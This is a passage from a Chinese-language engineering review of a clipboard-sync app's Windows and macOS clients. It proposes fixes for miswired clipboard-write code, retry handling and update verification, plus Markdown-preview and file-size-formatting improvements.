1. **正确与错误实现"接反了线"**：Windows 的 React UI 经 `invoke("restore_entry")` 走的是 commands.rs 的手工实现（含坏的 DIB 兜底），而同一个 crate 的 routes.rs:448/482 已经用 core 标准实现写对了；macOS 恰好相反，生效的 routes.rs 是对的，commands.rs 孪生是死代码。**问题七的修复大部分是"删代码 + 换调用"，不是写新代码。**
2. **入站图片在 Windows 上没有任何剪贴板占用兜底**（#15）：对端发来图片 → arboard 恰逢剪贴板被占用 → 写入失败 → shadow 已由 core 正确撤销，但消息 ID 未记录 → 发送方重试 → 若占用持续则与问题三的无上限重试叠加成循环。DIB 兜底应该放进 `TauriSyncPlatform::write_image`，让入站和本地恢复共用。
3. **全项目所有 Win32 写入函数（含正确的那些）都没有 OpenClipboard 有界重试**——剪贴板被其它程序短暂持有是常态，正确实现只是"干净地失败"。家族级改进点：共享一个"10 次 × 20ms"的重试助手。
4. **文件回声抑制是路径式而非哈希式**（识别 managed `clipboard-files/` 目录），天生免疫"写失败毒化抑制表"的失败模式——这个设计比文本/图片的哈希式 shadow 更稳，无需改动。

### 修订后的问题七修法

在原有三步（`set_clipboard_dib` 返回 Result + GlobalFree 配对 + GlobalLock 空指针检查 + 有界重试；调用处回滚 shadow；前端零改动）之上，改为更彻底的形态：

1. 把 arboard→CF_DIB 兜底整体搬进 `TauriSyncPlatform::write_image`（sync_adapter），入站与恢复共用一份；
2. Windows `commands.rs` restore_entry 的图片/文本分支改为直接调 `sync_engine.restore_image()/restore_text()`——照抄同 crate routes.rs:448/482 已有的写法；
3. 删除两端 `commands.rs` 中的手工 shadow 登记、`rgba_to_dib`、`set_clipboard_dib`（macOS 侧连同整份死代码孪生一起清理）；
4. Win32 写入函数共享有界重试助手（#10/#11 的四份重复 CF_HDROP 也应合并到一份）。

---

## 六、建议行动排序

| 优先级 | 事项 | 成本 |
|---|---|---|
| P0 | 发布后**真机闭环验证一次自动更新**（全链路从未有过成功记录，这是一.5 盲区的唯一实证解法）；#5 publish job 加 `signer verify` 闭合私钥↔公钥配对盲区 | 小 |
| P1 | #3 投递失败纪律（接收端错误分型 + 收窄重试范围）；#2 提交失败不删文件/不取消批次 + 磁盘自愈；#6 release 并发钉扎；#4 旧主题包下架 | 小-中 |
| P1 | #10 入站握手超时、JoinSet 回收、CF_DIB 假成功路径；体验速赢：MD 预览模式、大小格式化 MB/GB | 小 |
| P2 | #7 Unix socket + peer 凭证；#8 Tauri 权限收窄 + CSP；#9 ErrorBoundary | 中 |
| P2 | 性能类：wal_checkpoint 节流、托盘轮询降频、缩略图缓存；大图进度条/取消 | 中 |
| P3 | 文件专用通道；架构迁移（runtime 快照 / SVG 信任门入 core）、大文件拆分、文档矩阵更新 | 大 |

---

## 七、产品体验改进项（2026-08-28 追加）

### 1. 复制的 Markdown 文本不渲染（两端）

两端都有 Markdown 渲染器，但触发条件只挂在**文件扩展名**上（`.md`/`.markdown`，Windows previewFormat.ts:42-43、macOS HistoryPreview.swift:37）——即只有文件条目能渲染。剪贴板文本条目永远走纯文本：Windows `selectPreviewRenderer` 对 `kind === "text"` 无条件返回 `"text"`（previewFormat.ts:24，且该函数拿不到内容数据）；macOS 有内容检测但只有 `looksLikeCode`（HistoryPreview.swift:56-64），无 Markdown 判定。

**改法（2026-08-28 定稿：手动模式切换，不做检测路由）**：在两端文本预览**现有的模式切换器上加第三档 "MD"**，与 文本/代码 并列——macOS `HistoryPreviewTextMode` 枚举（plain/code，HistoryPreviewTextView.swift:4-6）加 `markdown` case + Picker tag（HistoryPreviewTextToolbar.swift:16-20）+ 渲染分支复用已存在的 `HistoryMarkdownPreviewView`；Windows `TextPreview` 的 plain/code 按钮组（:171/:179）加 "MD" 第三按钮，选中时复用 `MarkdownPreview` 的净化渲染；两端各补一个 i18n 键。零启发式、零误判、零跨平台一致性成本，判定交还给用户（复制者知道自己复制的是 Markdown）。曾评估的检测路由方案（looksLikeMarkdown + 共享 fixtures）已否决；若将来嫌手动切换烦，可把检测降格为"仅影响默认档位"（模仿 `initiallyCode` 模式，十行增量，不改架构）。

### 2. 历史大小格式化只有 KB 一档（两端同病）

- macOS `HistoryEntry.formattedSize`（HistoryEntry.swift:80-85）：手写阶梯只有 B/KB 两档，5MB 图片显示为 "5120.0 KB"；
- Windows `formatSize`（History.tsx:275-277）：同样只有 B/KB，且还用于文件传输进度（:1331-1332）——500MB 传输显示 "512000.0 KB / 524288.0 KB"；
- 讽刺的是两端其余位置都在用正确工具（macOS 三处 `ByteCountFormatter`；Windows 进度处另有格式化）。

**改法**：两端各补 MB/GB 档（保持 1024 进制、原有 KB 数值不变，最小 diff）；macOS 亦可直接改用 `ByteCountFormatter`（与 SettingsView:974 等三处一致，但会把进制换成 1000，属可见的行为变化，二选一）。文件传输进度的显示精度是主要受益者。
